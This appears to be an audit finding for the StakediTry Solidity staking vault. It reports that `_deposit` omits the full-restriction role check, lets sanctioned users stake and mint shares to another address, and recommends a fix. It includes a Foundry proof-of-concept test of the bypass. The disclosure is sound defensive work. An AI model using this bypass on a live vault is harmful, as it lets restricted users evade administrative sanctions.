## Title
FULL_RESTRICTED Users Can Bypass Staking Restriction Due to Incomplete Role Check in `_deposit`

## Summary
The `_deposit` function in `StakediTry.sol` only checks for `SOFT_RESTRICTED_STAKER_ROLE` but fails to check for `FULL_RESTRICTED_STAKER_ROLE`, allowing fully-restricted users to deposit (stake) iTRY tokens into the vault. This directly violates the documented invariant that FULL_RESTRICTED should prevent all staking operations. The vulnerability is particularly exploitable when users hold both restriction roles and one is subsequently removed, or when users are assigned only FULL_RESTRICTED without SOFT_RESTRICTED.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTry.sol` - `_deposit` function (lines 240-252)

**Intended Logic:** According to the role definition, `FULL_RESTRICTED_STAKER_ROLE` should prevent an address from transferring, staking, or unstaking [1](#0-0) . The `_deposit` function is the staking operation for the ERC4626 vault, and should therefore block users with FULL_RESTRICTED_STAKER_ROLE.

**Actual Logic:** The `_deposit` function only validates `SOFT_RESTRICTED_STAKER_ROLE` for both caller and receiver [2](#0-1) , but completely omits checking for `FULL_RESTRICTED_STAKER_ROLE`. This creates an inconsistency where fully-restricted users can still deposit if they don't simultaneously hold the soft restriction.

**Exploitation Path:**
1. **Scenario A - Direct Assignment**: Admin calls `addToBlacklist(maliciousUser, true)` which grants only `FULL_RESTRICTED_STAKER_ROLE` [3](#0-2) 
2. User calls `deposit(assets, receiverAddress)` where `receiverAddress` is a clean address controlled by the attacker
3. The `_deposit` check passes because neither caller nor receiver has `SOFT_RESTRICTED_STAKER_ROLE`
4. iTRY tokens are transferred from user to vault, wiTRY shares are minted to receiver, bypassing the restriction

**Scenario B - Dual Role with Partial Removal** (directly answering the audit question):
1. Admin calls `addToBlacklist(user, false)` → user gets `SOFT_RESTRICTED_STAKER_ROLE`
2. Admin calls `addToBlacklist(user, true)` → user now has **both roles** (no mutual exclusivity enforcement)
3. User cannot deposit (blocked by SOFT check) ✓
4. Admin later calls `removeFromBlacklist(user, false)` → only removes `SOFT_RESTRICTED_STAKER_ROLE` [4](#0-3) 
5. User still has `FULL_RESTRICTED_STAKER_ROLE` but can now deposit! ✗

**Security Property Broken:** The restriction enforcement that "FULL_RESTRICTED_STAKER_ROLE prevents staking" is violated. Additionally, the protocol assumes restriction roles work correctly, but the inconsistent checks create a bypass opportunity.

## Impact Explanation
- **Affected Assets**: wiTRY vault shares, iTRY tokens, protocol integrity of restriction enforcement
- **Damage Severity**: Restricted users can circumvent administrative sanctions by continuing to stake iTRY tokens and earn yield through the vault. While they cannot withdraw the shares themselves (blocked by `_withdraw` which properly checks FULL_RESTRICTED [5](#0-4) ), they can mint shares to secondary addresses under their control, effectively laundering their position through the vault.
- **User Impact**: All users with `FULL_RESTRICTED_STAKER_ROLE` but not `SOFT_RESTRICTED_STAKER_ROLE` can bypass restrictions. Admin operations that involve granting both roles and removing only one create exploitable state transitions.

## Likelihood Explanation
- **Attacker Profile**: Any user who has been assigned `FULL_RESTRICTED_STAKER_ROLE` without `SOFT_RESTRICTED_STAKER_ROLE`, or users who manipulate the dual-role state through admin role management
- **Preconditions**: 
  - User must have iTRY balance and approval for the vault
  - User must have `FULL_RESTRICTED_STAKER_ROLE` without `SOFT_RESTRICTED_STAKER_ROLE`
  - User needs a secondary address (receiver) that is not FULL_RESTRICTED
- **Execution Complexity**: Single transaction `deposit()` call - trivial to execute
- **Frequency**: Can be exploited repeatedly until the admin corrects the role assignment by adding `SOFT_RESTRICTED_STAKER_ROLE` or properly enforcing mutual exclusivity

## Recommendation
Add a check for `FULL_RESTRICTED_STAKER_ROLE` in the `_deposit` function to match the documented behavior:

```solidity
// In src/token/wiTRY/StakediTry.sol, function _deposit, line 247:

// CURRENT (vulnerable):
if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
    revert OperationNotAllowed();
}

// FIXED:
if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver) ||
    hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {
    revert OperationNotAllowed();
}
```

**Alternative mitigation**: Enforce mutual exclusivity in `addToBlacklist` to ensure users cannot hold both roles simultaneously, and when upgrading from SOFT to FULL restriction, automatically revoke the SOFT role.

## Proof of Concept
```solidity
// File: test/Exploit_FullRestrictedCanDeposit.t.sol
// Run with: forge test --match-test test_FullRestrictedCanDeposit -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract Exploit_FullRestrictedCanDeposit is Test {
    StakediTry public stakediTry;
    MockERC20 public iTryToken;
    
    address public admin;
    address public rewarder;
    address public restrictedUser;
    address public receiverAddress;
    
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
    bytes32 public constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
    bytes32 public constant SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
    bytes32 public constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
    
    function setUp() public {
        admin = makeAddr("admin");
        rewarder = makeAddr("rewarder");
        restrictedUser = makeAddr("restrictedUser");
        receiverAddress = makeAddr("receiver");
        
        // Deploy iTRY mock
        iTryToken = new MockERC20("iTRY", "iTRY");
        
        // Deploy StakediTry
        vm.prank(admin);
        stakediTry = new StakediTry(IERC20(address(iTryToken)), rewarder, admin);
        
        // Grant blacklist manager role
        vm.prank(admin);
        stakediTry.grantRole(BLACKLIST_MANAGER_ROLE, admin);
        
        // Mint tokens to restricted user
        iTryToken.mint(restrictedUser, 1000e18);
        
        // Approve vault
        vm.prank(restrictedUser);
        iTryToken.approve(address(stakediTry), type(uint256).max);
    }
    
    function test_FullRestrictedCanDeposit_Scenario1() public {
        // SCENARIO 1: User assigned only FULL_RESTRICTED (not SOFT)
        
        // Admin adds user to full blacklist only
        vm.prank(admin);
        stakediTry.addToBlacklist(restrictedUser, true); // isFullBlacklisting = true
        
        // Verify user has FULL_RESTRICTED but NOT SOFT_RESTRICTED
        assertTrue(stakediTry.hasRole(FULL_RESTRICTED_STAKER_ROLE, restrictedUser));
        assertFalse(stakediTry.hasRole(SOFT_RESTRICTED_STAKER_ROLE, restrictedUser));
        
        // EXPLOIT: Restricted user can deposit to mint shares for receiver
        vm.prank(restrictedUser);
        uint256 shares = stakediTry.deposit(100e18, receiverAddress);
        
        // VERIFY: Deposit succeeded despite FULL_RESTRICTED status
        assertEq(shares, 100e18, "Shares minted despite FULL_RESTRICTED");
        assertEq(stakediTry.balanceOf(receiverAddress), 100e18, "Receiver got shares");
        assertEq(iTryToken.balanceOf(restrictedUser), 900e18, "User's iTRY was transferred");
    }
    
    function test_FullRestrictedCanDeposit_Scenario2() public {
        // SCENARIO 2: User has both roles, then SOFT is removed
        
        // Step 1: Admin adds SOFT restriction
        vm.prank(admin);
        stakediTry.addToBlacklist(restrictedUser, false);
        
        // Step 2: Admin adds FULL restriction (user now has BOTH roles)
        vm.prank(admin);
        stakediTry.addToBlacklist(restrictedUser, true);
        
        // Verify user has BOTH roles
        assertTrue(stakediTry.hasRole(SOFT_RESTRICTED_STAKER_ROLE, restrictedUser));
        assertTrue(stakediTry.hasRole(FULL_RESTRICTED_STAKER_ROLE, restrictedUser));
        
        // User cannot deposit (blocked by SOFT check)
        vm.prank(restrictedUser);
        vm.expectRevert();
        stakediTry.deposit(100e18, receiverAddress);
        
        // Step 3: Admin removes SOFT restriction only
        vm.prank(admin);
        stakediTry.removeFromBlacklist(restrictedUser, false); // Remove SOFT only
        
        // Verify user still has FULL but not SOFT
        assertFalse(stakediTry.hasRole(SOFT_RESTRICTED_STAKER_ROLE, restrictedUser));
        assertTrue(stakediTry.hasRole(FULL_RESTRICTED_STAKER_ROLE, restrictedUser));
        
        // EXPLOIT: User can now deposit despite being FULL_RESTRICTED
        vm.prank(restrictedUser);
        uint256 shares = stakediTry.deposit(100e18, receiverAddress);
        
        // VERIFY: Deposit succeeded
        assertEq(shares, 100e18, "User bypassed restriction after partial removal");
        assertEq(stakediTry.balanceOf(receiverAddress), 100e18, "Shares minted to receiver");
    }
}
```

## Notes
This vulnerability directly answers the security question: **Yes, users can hold both `SOFT_RESTRICTED_STAKER_ROLE` and `FULL_RESTRICTED_STAKER_ROLE` simultaneously, and this DOES cause unexpected behavior**. The incomplete role checking in `_deposit` creates a bypass where:

1. Users with only FULL_RESTRICTED can still deposit
2. Users with both roles who have SOFT removed can suddenly deposit again
3. The protocol's restriction enforcement is inconsistent between different operations

The `_withdraw` function correctly checks FULL_RESTRICTED [5](#0-4) , and `_beforeTokenTransfer` also checks FULL_RESTRICTED [6](#0-5) , but `_deposit` only checks SOFT_RESTRICTED, creating an exploitable inconsistency in the restriction enforcement system.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L29-30)
```text
    /// @notice The role which prevents an address to transfer, stake, or unstake. The owner of the contract can redirect address staking balance if an address is in full restricting mode.
    bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
```

**File:** src/token/wiTRY/StakediTry.sol (L126-133)
```text
    function addToBlacklist(address target, bool isFullBlacklisting)
        external
        onlyRole(BLACKLIST_MANAGER_ROLE)
        notOwner(target)
    {
        bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
        _grantRole(role, target);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L140-143)
```text
    function removeFromBlacklist(address target, bool isFullBlacklisting) external onlyRole(BLACKLIST_MANAGER_ROLE) {
        bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
        _revokeRole(role, target);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L247-249)
```text
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
```

**File:** src/token/wiTRY/StakediTry.sol (L269-274)
```text
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
        }
```

**File:** src/token/wiTRY/StakediTry.sol (L292-298)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
            revert OperationNotAllowed();
        }
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
            revert OperationNotAllowed();
        }
```
